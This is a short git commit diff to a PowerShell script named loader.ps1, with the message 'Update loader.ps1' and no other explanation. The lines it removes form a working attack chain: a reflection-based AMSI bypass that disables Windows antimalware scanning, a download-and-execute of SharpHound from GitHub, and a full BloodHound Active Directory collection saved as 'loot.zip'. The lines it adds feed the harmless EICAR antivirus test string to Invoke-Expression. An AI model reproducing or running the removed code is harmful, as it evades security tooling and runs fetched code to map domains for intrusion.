3fbc0dfb213beda58d31d56e966101db3a145e47
Tyler the Pug <50224819+tylerwhardy@users.noreply.github.com>
2025-07-06 20:36:46 -0400

    Update loader.ps1

--- loader.ps1
+++ loader.ps1
@@ -1,7 +1,2 @@
-$Flags = [System.Reflection.BindingFlags] "NonPublic,Static"
-$AmsiUtils = [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")
-$Field = $AmsiUtils.GetField("amsiInitFailed", $Flags)
-$Field.SetValue($null, $true)
-$sharpHoundCode = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1" -UseBasicParsing
-Invoke-Expression $sharpHoundCode.Content
-Invoke-BloodHound -CollectionMethod All -ZipFileName loot.zip
+$eicar = 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
+Invoke-Expression $eicar
